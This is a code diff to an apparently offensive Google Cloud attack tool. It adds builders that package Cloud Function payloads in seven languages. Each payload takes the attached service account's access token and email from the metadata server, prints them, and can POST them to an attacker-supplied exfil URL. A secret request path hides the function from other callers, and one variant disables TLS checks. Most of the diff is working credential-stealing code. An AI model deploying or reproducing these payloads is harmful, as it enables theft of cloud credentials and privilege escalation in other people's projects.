@@ -1,17 +1,9 @@
-"""Cloud Functions enumeration/exploit helpers (gen1 + gen2).
-
-Covers both API generations: ``version`` "1" routes to functions_v1, "2" to functions_v2,
-which differ in request shape (v1 takes source_archive_url; v2 a storageSource bucket/object).
-The create/update/call helpers are the privesc surface -- deploying a function with an attached
-service account, or invoking one, lets an attacker pivot. V2 invoke has no Python client, so it
-is hand-built over REST with an OAuth identity token. CloudFunctionsResource enumerates into
-``cloudfunctions_functions`` and can download a function's source zip from its backing GCS object.
-"""
-
 from __future__ import annotations
 
 import json
 import re
+import subprocess
+import tempfile
 import requests
 from pathlib import Path
 from urllib.parse import urlparse
@@ -68,6 +60,7 @@ def _create_function(
         sa: Optional[str] = None,
         debug: Optional[bool] = None,
         env_vars: Optional[Dict[str, str]] = None,
+        runtime: str = "python314",
     ) -> Union[CloudFunction, Function, None]:
     """Deploy a new function (gen1 or gen2) from a GCS source archive; return the created function.
 
@@ -89,7 +82,7 @@ def _create_function(
                 source_archive_url=bucket_source,
                 name=function_name,
                 entry_point=entry_point,
-                runtime="python310",
+                runtime=runtime,
                 https_trigger=functions_v1.HttpsTrigger(),
             )
             if sa:
@@ -130,7 +123,7 @@ def _create_function(
 
             build_config = {
                 "entry_point": entry_point,
-                "runtime": "python312",
+                "runtime": runtime,
                 "source": {
                     "storage_source": {
                         "bucket": bucket_name,
@@ -189,6 +182,7 @@ def _update_function(
     sa: Optional[str] = None,
     debug: Optional[bool] = None,
     env_vars: Optional[Dict[str, str]] = None,
+    runtime: str = "python314",
 ) -> Union[Policy, None]:
     if debug:
         print(f"[*] Updating function {function_name}")
@@ -205,7 +199,7 @@ def _update_function(
                 source_archive_url=bucket_source,
                 name=function_name,
                 entry_point=entry_point,
-                runtime="python310",
+                runtime=runtime,
             )
             if sa:
                 fn.service_account_email = sa
@@ -247,7 +241,7 @@ def _update_function(
 
             build_config = {
                 "entry_point": entry_point,
-                "runtime": "python312",
+                "runtime": runtime,
                 "source": {
                     "storage_source": {
                         "bucket": bucket,
@@ -411,45 +405,607 @@ def _call_function(
     return response_data
 
 
-def _build_url_payload_zip(exfil_url: str) -> bytes:
-    """Build a Cloud Functions source zip with the callback URL baked into the code.
+# ─── Runtime metadata ────────────────────────────────────────────────────────
+# Maps runtime-ID prefix → (default entry point, V1 supported bool)
+_RUNTIME_META: Dict[str, tuple] = {
+    "python":  ("data_exfil",               True),
+    "nodejs":  ("dataExfil",                True),
+    "go":      ("DataExfil",                True),
+    "java":    ("gcpwn.DataExfil",          True),
+    "ruby":    ("dataExfil",                True),
+    "php":     ("dataExfil",                False),  # V2 only
+    "dotnet":  ("GcpwnFunctions.DataExfil", False),  # V2 only
+}
 
-    Returns raw zip bytes. The generated function POSTs the token to exfil_url and
-    returns a minimal JSON body — no log markers are printed (zero Cloud Logging footprint).
-    """
+# All known (non-deprecated) runtime IDs — ordered most-recent-first per language.
+# Default for each language is the first entry.
+SUPPORTED_RUNTIMES = [
+    # Python — default: python314
+    "python314", "python313", "python312", "python311", "python310",
+    # Node.js — default: nodejs24 (nodejs26 is Preview)
+    "nodejs24", "nodejs22", "nodejs20", "nodejs18", "nodejs26",
+    # Go — default: go125 (go126 is Preview)
+    "go125", "go124", "go123", "go122", "go121", "go126",
+    # Java — default: java25
+    "java25", "java21", "java17",
+    # Ruby — default: ruby40
+    "ruby40", "ruby34", "ruby33", "ruby32",
+    # PHP (V2 only) — default: php85
+    "php85", "php84", "php83", "php82",
+    # .NET (V2 only) — default: dotnet10
+    "dotnet10", "dotnet8",
+]
+
+# V1-compatible runtime IDs (V1 supports only older, non-PHP/dotnet runtimes)
+_V1_RUNTIMES = {
+    "python310", "python39", "python38", "python37",
+    "nodejs18", "nodejs16", "nodejs14", "nodejs12", "nodejs10",
+    "go120", "go119", "go118", "go116", "go113",
+    "java11",
+    "ruby30", "ruby27", "ruby26",
+}
+
+
+def _lang_from_runtime(runtime: str) -> str:
+    for prefix in _RUNTIME_META:
+        if runtime.startswith(prefix):
+            return prefix
+    return "python"
+
+
+def _default_entry_point(runtime: str) -> str:
+    return _RUNTIME_META.get(_lang_from_runtime(runtime), ("data_exfil", True))[0]
+
+
+def _runtime_v1_ok(runtime: str) -> bool:
+    lang = _lang_from_runtime(runtime)
+    return _RUNTIME_META.get(lang, (None, False))[1] and runtime in _V1_RUNTIMES
+
+
+# ─── Per-language payload builders ───────────────────────────────────────────
+
+def _zip_from_files(files: Dict[str, str]) -> bytes:
     import io
     import zipfile as _zf
+    buf = io.BytesIO()
+    with _zf.ZipFile(buf, "w", _zf.ZIP_DEFLATED) as zf:
+        for name, content in files.items():
+            zf.writestr(name, content)
+    return buf.getvalue()
 
-    main_py = "\n".join([
+
+def _python_payload(exfil_url: str = "", secret_path: str = "") -> Dict[str, str]:
+    lines = [
         "import json, urllib.request",
         "_BASE = 'http://metadata.google.internal/computeMetadata/v1/instance/service-accounts/default/'",
         "_HDR = {'Metadata-Flavor': 'Google'}",
-        "_EXFIL_URL = " + repr(exfil_url),
-        "",
-        "def data_exfil(request):",
-        "    def _get(path):",
-        "        req = urllib.request.Request(_BASE + path, headers=_HDR)",
+        "_MARKER_TOKEN = 'GCPWN_CF_TOKEN='",
+        "_MARKER_EMAIL = 'GCPWN_CF_EMAIL='",
+    ]
+    if exfil_url:
+        lines.append("_EXFIL_URL = " + repr(exfil_url))
+    if secret_path:
+        lines.append("_SECRET_PATH = " + repr(secret_path))
+    lines += ["", "def data_exfil(request):"]
+    if secret_path:
+        lines += [
+            "    if request.path.split('?')[0] != _SECRET_PATH:",
+            "        return ('', 404)",
+        ]
+    lines += [
+        "    def _get(p):",
+        "        req = urllib.request.Request(_BASE + p, headers=_HDR)",
         "        with urllib.request.urlopen(req, timeout=5) as r:",
         "            return r.read().decode()",
         "    try:",
         "        email = _get('email').strip()",
-        "        token = json.loads(_get('token'))",
-        "        access_token = token.get('access_token', '')",
-        "        body = json.dumps({'email': email, 'access_token': access_token}).encode()",
-        "        cb = urllib.request.Request(",
-        "            _EXFIL_URL, data=body,",
-        "            headers={'Content-Type': 'application/json'}, method='POST'",
-        "        )",
-        "        try: urllib.request.urlopen(cb, timeout=10)",
-        "        except Exception: pass",
+        "        tok = json.loads(_get('token'))",
+        "        access_token = tok.get('access_token', '')",
+        "        print(_MARKER_EMAIL + email, flush=True)",
+        "        print(_MARKER_TOKEN + access_token, flush=True)",
+    ]
+    if exfil_url:
+        lines += [
+            "        body = json.dumps({'email': email, 'access_token': access_token}).encode()",
+            "        cb = urllib.request.Request(",
+            "            _EXFIL_URL, data=body,",
+            "            headers={'Content-Type': 'application/json'}, method='POST'",
+            "        )",
+            "        try: urllib.request.urlopen(cb, timeout=10)",
+            "        except Exception: pass",
+        ]
+    lines += [
         "        return {'email': email, 'access_token': access_token}",
         "    except Exception as exc:",
         "        return {'error': str(exc)}, 500",
-    ])
-    buf = io.BytesIO()
-    with _zf.ZipFile(buf, "w", _zf.ZIP_DEFLATED) as zf:
-        zf.writestr("main.py", main_py)
-    return buf.getvalue()
+    ]
+    return {"main.py": "\n".join(lines)}
+
+
+def _nodejs_payload(exfil_url: str = "", secret_path: str = "") -> Dict[str, str]:
+    cb = repr(exfil_url) if exfil_url else None
+    sp = repr(secret_path) if secret_path else None
+    consts = ""
+    if cb:
+        consts += f"const _EXFIL_URL = {cb};\n"
+    if sp:
+        consts += f"const _SECRET_PATH = {sp};\n"
+    path_check = ""
+    if secret_path:
+        path_check = (
+            "  if (req.path !== _SECRET_PATH) { res.status(404).send('Not Found'); return; }\n"
+        )
+    callback_code = ""
+    if exfil_url:
+        callback_code = """\
+  await new Promise((resolve) => {
+    const body = JSON.stringify({email, access_token});
+    const cu = new URL(_EXFIL_URL);
+    const mod = cu.protocol === 'https:' ? require('https') : require('http');
+    const opts = {
+      hostname: cu.hostname, port: cu.port || (cu.protocol === 'https:' ? 443 : 80),
+      path: cu.pathname + cu.search, method: 'POST',
+      headers: {'Content-Type': 'application/json', 'Content-Length': Buffer.byteLength(body)}
+    };
+    const r = mod.request(opts, resolve); r.on('error', resolve); r.write(body); r.end();
+  });
+"""
+    index_js = f"""\
+'use strict';
+const functions = require('@google-cloud/functions-framework');
+const http = require('http');
+const MARKER_EMAIL = 'GCPWN_CF_EMAIL=';
+const MARKER_TOKEN = 'GCPWN_CF_TOKEN=';
+{consts}
+function fetchMeta(path) {{
+  return new Promise((resolve, reject) => {{
+    const opts = {{
+      hostname: 'metadata.google.internal',
+      path: '/computeMetadata/v1/instance/service-accounts/default/' + path,
+      headers: {{'Metadata-Flavor': 'Google'}}
+    }};
+    http.get(opts, (res) => {{ let d = ''; res.on('data', c => d += c); res.on('end', () => resolve(d)); }})
+        .on('error', reject);
+  }});
+}}
+
+functions.http('dataExfil', async (req, res) => {{
+{path_check}\
+  try {{
+    const [tokenJson, emailRaw] = await Promise.all([fetchMeta('token'), fetchMeta('email')]);
+    const token = JSON.parse(tokenJson);
+    const access_token = token.access_token || '';
+    const email = emailRaw.trim();
+    console.log(MARKER_EMAIL + email);
+    console.log(MARKER_TOKEN + access_token);
+{callback_code}\
+    res.json({{email, access_token}});
+  }} catch (err) {{
+    res.status(500).json({{error: err.message}});
+  }}
+}});
+"""
+    package_json = '{"main":"index.js","dependencies":{"@google-cloud/functions-framework":"^3.0.0"}}'
+    return {"index.js": index_js, "package.json": package_json}
+
+
+def _go_payload(exfil_url: str = "", secret_path: str = "") -> Dict[str, str]:
+    consts = ""
+    if secret_path:
+        consts += f'const _SECRET_PATH = {json.dumps(secret_path)}\n'
+    if exfil_url:
+        consts += f'const _EXFIL_URL = {json.dumps(exfil_url)}\n'
+    path_check = ""
+    if secret_path:
+        path_check = '\tif r.URL.Path != _SECRET_PATH { http.NotFound(w, r); return }\n'
+    callback_code = ""
+    if exfil_url:
+        callback_code = """\
+\tbody2, _ := json.Marshal(map[string]string{"email": email, "access_token": accessToken})
+\treq2, _ := http.NewRequest("POST", _EXFIL_URL, bytes.NewReader(body2))
+\tif req2 != nil {
+\t\treq2.Header.Set("Content-Type", "application/json")
+\t\tresp2, err2 := httpClient.Do(req2)
+\t\tif err2 == nil && resp2 != nil { resp2.Body.Close() }
+\t}
+"""
+    imports = ['"encoding/json"', '"fmt"', '"io"', '"net/http"', '"strings"']
+    if exfil_url:
+        imports += ['"bytes"', '"crypto/tls"', '"time"']
+    imports_str = "\n\t".join(imports)
+    if exfil_url:
+        http_client_decl = """\
+var httpClient = &http.Client{
+\tTimeout: 15 * time.Second,
+\tTransport: &http.Transport{TLSClientConfig: &tls.Config{InsecureSkipVerify: true}},
+}"""
+    else:
+        http_client_decl = "var httpClient = &http.Client{Timeout: 10 * time.Second}"
+        imports += ['"time"']
+        imports_str = "\n\t".join(imports)
+    function_go = f"""\
+package p
+
+import (
+\t{imports_str}
+)
+
+{http_client_decl}
+{consts}
+func fetchMeta(path string) (string, error) {{
+\treq, err := http.NewRequest("GET", "http://metadata.google.internal/computeMetadata/v1/instance/service-accounts/default/"+path, nil)
+\tif err != nil {{ return "", err }}
+\treq.Header.Set("Metadata-Flavor", "Google")
+\tresp, err := httpClient.Do(req)
+\tif err != nil {{ return "", err }}
+\tdefer resp.Body.Close()
+\tb, err := io.ReadAll(resp.Body)
+\treturn string(b), err
+}}
+
+func DataExfil(w http.ResponseWriter, r *http.Request) {{
+{path_check}\
+\ttokenJSON, err := fetchMeta("token")
+\tif err != nil {{ http.Error(w, err.Error(), 500); return }}
+\traw, _ := fetchMeta("email")
+\temail := strings.TrimSpace(raw)
+\tvar tokenData map[string]interface{{}}
+\tjson.Unmarshal([]byte(tokenJSON), &tokenData)
+\taccessToken, _ := tokenData["access_token"].(string)
+\tfmt.Printf("GCPWN_CF_EMAIL=%s\\n", email)
+\tfmt.Printf("GCPWN_CF_TOKEN=%s\\n", accessToken)
+{callback_code}\
+\tw.Header().Set("Content-Type", "application/json")
+\tjson.NewEncoder(w).Encode(map[string]interface{{}}{{"email": email, "access_token": accessToken}})
+}}
+"""
+    go_mod = "module gcpwn.local/cf\n\ngo 1.22\n"
+    return {"function.go": function_go, "go.mod": go_mod}
+
+
+def _java_payload(exfil_url: str = "", secret_path: str = "") -> Dict[str, str]:
+    path_check = ""
+    if secret_path:
+        path_check = (
+            f'        String reqPath = request.getPath();\n'
+            f'        if (!{json.dumps(secret_path)}.equals(reqPath)) {{\n'
+            f'            response.setStatusCode(404);\n'
+            f'            return;\n'
+            f'        }}\n'
+        )
+    callback_code = ""
+    if exfil_url:
+        callback_code = f"""\
+        try {{
+            URL cbUrl = new URL({json.dumps(exfil_url)});
+            HttpURLConnection cbConn = (HttpURLConnection) cbUrl.openConnection();
+            cbConn.setRequestMethod("POST");
+            cbConn.setDoOutput(true);
+            cbConn.setRequestProperty("Content-Type", "application/json");
+            String cbBody = "{{\\"email\\":\\"" + email + "\\",\\"access_token\\":\\"" + accessToken + "\\"}}";
+            cbConn.getOutputStream().write(cbBody.getBytes(StandardCharsets.UTF_8));
+            cbConn.getResponseCode();
+        }} catch (Exception ignored) {{}}
+"""
+    java_src = f"""\
+package gcpwn;
+
+import com.google.cloud.functions.HttpFunction;
+import com.google.cloud.functions.HttpRequest;
+import com.google.cloud.functions.HttpResponse;
+import java.io.*;
+import java.net.*;
+import java.nio.charset.StandardCharsets;
+
+public class DataExfil implements HttpFunction {{
+    private static final String BASE =
+        "http://metadata.google.internal/computeMetadata/v1/instance/service-accounts/default/";
+
+    @Override
+    public void service(HttpRequest request, HttpResponse response) throws Exception {{
+{path_check}\
+        String tokenJson = fetchMeta("token");
+        String email = fetchMeta("email").trim();
+
+        String accessToken = "";
+        int i = tokenJson.indexOf("\\"access_token\\"");
+        if (i >= 0) {{
+            int s = tokenJson.indexOf('"', i + 15) + 1;
+            int e = tokenJson.indexOf('"', s);
+            if (s > 0 && e > s) accessToken = tokenJson.substring(s, e);
+        }}
+
+        System.out.println("GCPWN_CF_EMAIL=" + email);
+        System.out.println("GCPWN_CF_TOKEN=" + accessToken);
+{callback_code}\
+        response.setContentType("application/json");
+        response.getWriter().write("{{\\"email\\":\\"" + email +
+            "\\",\\"access_token\\":\\"" + accessToken + "\\"}}");
+    }}
+
+    private String fetchMeta(String path) throws Exception {{
+        URL url = new URL(BASE + path);
+        HttpURLConnection c = (HttpURLConnection) url.openConnection();
+        c.setRequestProperty("Metadata-Flavor", "Google");
+        try (BufferedReader br = new BufferedReader(
+                new InputStreamReader(c.getInputStream(), StandardCharsets.UTF_8))) {{
+            StringBuilder sb = new StringBuilder();
+            String line;
+            while ((line = br.readLine()) != null) sb.append(line);
+            return sb.toString();
+        }}
+    }}
+}}
+"""
+    pom_xml = """\
+<?xml version="1.0" encoding="UTF-8"?>
+<project xmlns="http://maven.apache.org/POM/4.0.0"
+         xmlns:xsi="http://www.w3.org/2001/XMLSchema-instance"
+         xsi:schemaLocation="http://maven.apache.org/POM/4.0.0 http://maven.apache.org/xsd/maven-4.0.0.xsd">
+  <modelVersion>4.0.0</modelVersion>
+  <groupId>gcpwn</groupId>
+  <artifactId>data-exfil</artifactId>
+  <version>1.0.0</version>
+  <properties>
+    <maven.compiler.source>21</maven.compiler.source>
+    <maven.compiler.target>21</maven.compiler.target>
+  </properties>
+  <dependencies>
+    <dependency>
+      <groupId>com.google.cloud.functions</groupId>
+      <artifactId>functions-framework-api</artifactId>
+      <version>1.1.0</version>
+      <scope>provided</scope>
+    </dependency>
+  </dependencies>
+</project>
+"""
+    return {"src/main/java/gcpwn/DataExfil.java": java_src, "pom.xml": pom_xml}
+
+
+_RUBY_GEMFILE_LOCK_FALLBACK = """\
+GEM
+  remote: https://rubygems.org/
+  specs:
+    cloud_events (0.9.0)
+    functions_framework (1.7.0)
+      cloud_events (>= 0.7.0, < 2.a)
+      puma (>= 4.3.0, < 9.a)
+      rack (>= 2.1, < 4.a)
+    logger (1.7.0)
+    nio4r (2.7.5)
+    puma (8.0.2)
+      nio4r (~> 2.0)
+    rack (3.2.6)
+
+PLATFORMS
+  ruby
+
+DEPENDENCIES
+  functions_framework
+  logger
+
+BUNDLED WITH
+   2.6.7
+"""
+
+
+def _ruby_gemfile_lock(gemfile_content: str) -> str:
+    try:
+        with tempfile.TemporaryDirectory() as tmp:
+            gf = Path(tmp) / "Gemfile"
+            gf.write_text(gemfile_content, encoding="utf-8")
+            result = subprocess.run(
+                ["bundle", "lock"],
+                cwd=tmp,
+                capture_output=True,
+                text=True,
+                timeout=60,
+            )
+            lock_path = Path(tmp) / "Gemfile.lock"
+            if result.returncode == 0 and lock_path.exists():
+                return lock_path.read_text(encoding="utf-8")
+    except Exception:
+        pass
+    return _RUBY_GEMFILE_LOCK_FALLBACK
+
+
+def _ruby_payload(exfil_url: str = "", secret_path: str = "") -> Dict[str, str]:
+    path_check = ""
+    if secret_path:
+        path_check = (
+            f'  return [404, {{}}, ["Not Found"]] if request.path != {repr(secret_path)}\n'
+        )
+    callback_code = ""
+    if exfil_url:
+        callback_code = f"""\
+  begin
+    cb_uri = URI({repr(exfil_url)})
+    cb_req = Net::HTTP::Post.new(cb_uri)
+    cb_req["Content-Type"] = "application/json"
+    cb_req.body = JSON.generate({{email: email, access_token: access_token}})
+    Net::HTTP.start(cb_uri.hostname, cb_uri.port, use_ssl: cb_uri.scheme == "https") {{ |h| h.request(cb_req) }}
+  rescue StandardError
+  end
+"""
+    app_rb = f"""\
+require "functions_framework"
+require "net/http"
+require "json"
+require "uri"
+
+BASE = "http://metadata.google.internal/computeMetadata/v1/instance/service-accounts/default/"
+MARKER_EMAIL = "GCPWN_CF_EMAIL="
+MARKER_TOKEN = "GCPWN_CF_TOKEN="
+
+def fetch_meta(path)
+  uri = URI(BASE + path)
+  req = Net::HTTP::Get.new(uri)
+  req["Metadata-Flavor"] = "Google"
+  Net::HTTP.start(uri.hostname, uri.port) {{ |http| http.request(req) }}.body
+end
+
+FunctionsFramework.http "dataExfil" do |request|
+{path_check}\
+  begin
+    token_data = JSON.parse(fetch_meta("token"))
+    access_token = token_data["access_token"] || ""
+    email = fetch_meta("email").strip
+    $stdout.puts MARKER_EMAIL + email
+    $stdout.puts MARKER_TOKEN + access_token
+    $stdout.flush
+{callback_code}\
+    [200, {{"Content-Type" => "application/json"}},
+     [JSON.generate({{email: email, access_token: access_token}})]]
+  rescue => e
+    [500, {{"Content-Type" => "application/json"}}, [JSON.generate({{error: e.message}})]]
+  end
+end
+"""
+    gemfile = 'source "https://rubygems.org"\ngem "functions_framework"\ngem "logger"\n'
+    gemfile_lock = _ruby_gemfile_lock(gemfile)
+    return {"app.rb": app_rb, "Gemfile": gemfile, "Gemfile.lock": gemfile_lock}
+
+
+def _php_payload(exfil_url: str = "", secret_path: str = "") -> Dict[str, str]:
+    path_check = ""
+    if secret_path:
+        path_check = (
+            f'    $reqPath = $request->getUri()->getPath();\n'
+            f'    if ($reqPath !== {repr(secret_path)}) {{\n'
+            f'        return new \\GuzzleHttp\\Psr7\\Response(404);\n'
+            f'    }}\n'
+        )
+    callback_code = ""
+    if exfil_url:
+        callback_code = f"""\
+    try {{
+        $cbBody = json_encode(['email' => $email, 'access_token' => $accessToken]);
+        $cbOpts = ['http' => ['method' => 'POST', 'header' => "Content-Type: application/json\\r\\n", 'content' => $cbBody]];
+        @file_get_contents({repr(exfil_url)}, false, stream_context_create($cbOpts));
+    }} catch (\\Exception $ignored) {{}}
+"""
+    index_php = f"""\
+<?php
+use Google\\CloudFunctions\\FunctionsFramework;
+use Psr\\Http\\Message\\ServerRequestInterface;
+
+FunctionsFramework::http('dataExfil', 'dataExfil');
+
+function fetchMeta(string $path): string {{
+    $opts = ['http' => ['header' => "Metadata-Flavor: Google\\r\\n"]];
+    return (string) file_get_contents(
+        'http://metadata.google.internal/computeMetadata/v1/instance/service-accounts/default/' . $path,
+        false, stream_context_create($opts)
+    );
+}}
+
+function dataExfil(ServerRequestInterface $request): string {{
+{path_check}\
+    $tokenData = json_decode(fetchMeta('token'), true);
+    $accessToken = $tokenData['access_token'] ?? '';
+    $email = trim(fetchMeta('email'));
+    error_log('GCPWN_CF_EMAIL=' . $email);
+    error_log('GCPWN_CF_TOKEN=' . $accessToken);
+{callback_code}\
+    header('Content-Type: application/json');
+    return json_encode(['email' => $email, 'access_token' => $accessToken]);
+}}
+"""
+    composer = '{"require":{"google/cloud-functions-framework":"^1.2"}}'
+    return {"index.php": index_php, "composer.json": composer}
+
+
+def _dotnet_payload(exfil_url: str = "", secret_path: str = "", runtime: str = "dotnet10") -> Dict[str, str]:
+    # dotnet10 → net10.0, dotnet8 → net8.0
+    ver = runtime.replace("dotnet", "")
+    tfm = f"net{ver}.0"
+    path_check = ""
+    if secret_path:
+        path_check = (
+            f'        if (context.Request.Path != {json.dumps(secret_path)}) {{\n'
+            f'            context.Response.StatusCode = 404; return;\n'
+            f'        }}\n'
+        )
+    callback_code = ""
+    if exfil_url:
+        callback_code = f"""\
+        try {{
+            using var cbReq = new HttpRequestMessage(HttpMethod.Post, {json.dumps(exfil_url)});
+            cbReq.Content = JsonContent.Create(new {{ email, access_token = accessToken }});
+            await Client.SendAsync(cbReq);
+        }} catch {{ }}
+"""
+    cs = f"""\
+using Google.Cloud.Functions.Framework;
+using Microsoft.AspNetCore.Http;
+using System;
+using System.Net.Http;
+using System.Net.Http.Json;
+using System.Text.Json;
+using System.Threading.Tasks;
+
+namespace GcpwnFunctions;
+
+public class DataExfil : IHttpFunction
+{{
+    private static readonly HttpClient Client = new();
+    private const string Base = "http://metadata.google.internal/computeMetadata/v1/instance/service-accounts/default/";
+
+    public async Task HandleAsync(HttpContext context)
+    {{
+{path_check}\
+        var tokenResp = await FetchMeta("token");
+        var email = (await FetchMeta("email")).Trim();
+        using var doc = JsonDocument.Parse(tokenResp);
+        var accessToken = doc.RootElement.GetProperty("access_token").GetString() ?? "";
+        Console.WriteLine($"GCPWN_CF_EMAIL={{email}}");
+        Console.WriteLine($"GCPWN_CF_TOKEN={{accessToken}}");
+{callback_code}\
+        context.Response.ContentType = "application/json";
+        await context.Response.WriteAsJsonAsync(new {{ email, access_token = accessToken }});
+    }}
+
+    private async Task<string> FetchMeta(string path)
+    {{
+        using var req = new HttpRequestMessage(HttpMethod.Get, Base + path);
+        req.Headers.Add("Metadata-Flavor", "Google");
+        var resp = await Client.SendAsync(req);
+        return await resp.Content.ReadAsStringAsync();
+    }}
+}}
+"""
+    csproj = f"""\
+<Project Sdk="Microsoft.NET.Sdk">
+  <PropertyGroup>
+    <OutputType>Exe</OutputType>
+    <TargetFramework>{tfm}</TargetFramework>
+    <Nullable>enable</Nullable>
+  </PropertyGroup>
+  <ItemGroup>
+    <PackageReference Include="Google.Cloud.Functions.Hosting" Version="*" />
+  </ItemGroup>
+</Project>
+"""
+    return {"Function.cs": cs, "DataExfil.csproj": csproj}
+
+
+def _build_payload_zip(exfil_url: str = "", secret_path: str = "", runtime: str = "python314") -> bytes:
+    lang = _lang_from_runtime(runtime)
+    builders: Dict[str, Any] = {
+        "python": _python_payload,
+        "nodejs": _nodejs_payload,
+        "go":     _go_payload,
+        "java":   _java_payload,
+        "ruby":   _ruby_payload,
+        "php":    _php_payload,
+        "dotnet": _dotnet_payload,
+    }
+    if lang == "dotnet":
+        files = _dotnet_payload(exfil_url=exfil_url, secret_path=secret_path, runtime=runtime)
+    else:
+        files = builders.get(lang, _python_payload)(exfil_url=exfil_url, secret_path=secret_path)
+    return _zip_from_files(files)
 
 
 # Mirroring check_bucket_existence from Rhino Security: https://github.com/RhinoSecurityLabs/GCPBucketBrute
@@ -475,7 +1031,7 @@ def check_anonymous_external(
 
         function_url = f"https://{location}-{project}.cloudfunctions.net/{name}"
 
-    response = requests.get(function_url)
+    response = requests.get(function_url, timeout=10)
 
     if response.status_code not in [400, 401, 404] and "Your client does not have permission to get" not in response.text:
         if printout:
@@ -879,20 +1435,20 @@ class CloudFunctionsResource:
 
     def create(self, *, function_name: str, source_uri: str, version: str,
                entry_point: str = "data_exfil", sa: Optional[str] = None,
-               env_vars: Optional[Dict[str, str]] = None):
+               env_vars: Optional[Dict[str, str]] = None, runtime: str = "python314"):
         client = self.client_v1 if version == "1" else self.client
         return _create_function(
             client, function_name, source_uri, version, entry_point,
-            sa=sa, env_vars=env_vars,
+            sa=sa, env_vars=env_vars, runtime=runtime,
         )
 
     def update(self, *, function_name: str, source_uri: str, version: str,
                entry_point: str = "data_exfil", sa: Optional[str] = None,
-               env_vars: Optional[Dict[str, str]] = None):
+               env_vars: Optional[Dict[str, str]] = None, runtime: str = "python314"):
         client = self.client_v1 if version == "1" else self.client
         return _update_function(
             client, function_name, source_uri, version, entry_point,
-            sa=sa, env_vars=env_vars,
+            sa=sa, env_vars=env_vars, runtime=runtime,
         )
 
     def get_invoke_url(self, *, function_name: str) -> str:
@@ -920,19 +1476,15 @@ class CloudFunctionsResource:
             )
             return None
 
-    def invoke_v2(self, *, function_name: str) -> Optional[str]:
-        """Invoke a V2 function via REST with an OIDC identity token; return response text or None.
-
-        Prefers SA-credential ID token minting (service account keys); falls back to access token
-        (which may get a 401 on private functions if the caller is a user credential).
-        """
+    def invoke_v2(self, *, function_name: str, path: str = "") -> Optional[str]:
         from google.auth.transport.requests import Request as _GAuthReq
 
-        url = self.get_invoke_url(function_name=function_name)
+        base_url = self.get_invoke_url(function_name=function_name)
+        invoke_url = base_url.rstrip("/") + path if path else base_url
         creds = self.session.credentials
         id_token: Optional[str] = None
 
-        # SA credentials: mint an OIDC ID token directly
+        # Mint OIDC ID token with audience = base URL (no path)
         try:
             from google.oauth2.service_account import IDTokenCredentials as _IDTCreds
             _TOKEN_URI = "https://oauth2.googleapis.com/token"
@@ -940,7 +1492,7 @@ class CloudFunctionsResource:
                 creds._signer,
                 service_account_email=creds.service_account_email,
                 token_uri=_TOKEN_URI,
-                target_audience=url,
+                target_audience=base_url,
             )
             id_creds.refresh(_GAuthReq())
             id_token = id_creds.token
@@ -955,7 +1507,7 @@ class CloudFunctionsResource:
 
         try:
             resp = requests.post(
-                url,
+                invoke_url,
                 headers={"Authorization": f"Bearer {id_token}", "Content-Type": "application/json"},
                 json={"data": "test"},
                 timeout=70,
@@ -965,11 +1517,10 @@ class CloudFunctionsResource:
             print(f"{UtilityTools.YELLOW}[!] V2 invoke error: {e}{UtilityTools.RESET}")
             return None
 
-    def invoke(self, *, function_name: str, version: str) -> Optional[str]:
-        """Invoke a Cloud Function (V1 or V2); return response text or None."""
+    def invoke(self, *, function_name: str, version: str, path: str = "") -> Optional[str]:
         if version == "1":
             return self.invoke_v1(function_name=function_name)
-        return self.invoke_v2(function_name=function_name)
+        return self.invoke_v2(function_name=function_name, path=path)
 
     def delete(self, *, function_name: str, version: str) -> bool:
         """Delete a function; blocks on the V2 LRO. Returns True on success."""
@@ -992,10 +1543,9 @@ class CloudFunctionsResource:
             )
             return False
 
-    def build_and_upload_url_payload(self, *, exfil_url: str, bucket: str, project_id: str) -> Optional[str]:
-        """Build a URL-baked source zip and upload to GCS. Returns the gs:// URI or None on error."""
+    def build_and_upload_payload(self, *, bucket: str, project_id: str, exfil_url: str = "", secret_path: str = "", runtime: str = "python314") -> Optional[str]:
         import time as _t
-        zip_bytes = _build_url_payload_zip(exfil_url)
+        zip_bytes = _build_payload_zip(exfil_url=exfil_url, secret_path=secret_path, runtime=runtime)
         obj_name = f"gcpwn-cf-url-{int(_t.time())}.zip"
         dest_uri = f"gs://{bucket}/{obj_name}"
         try:
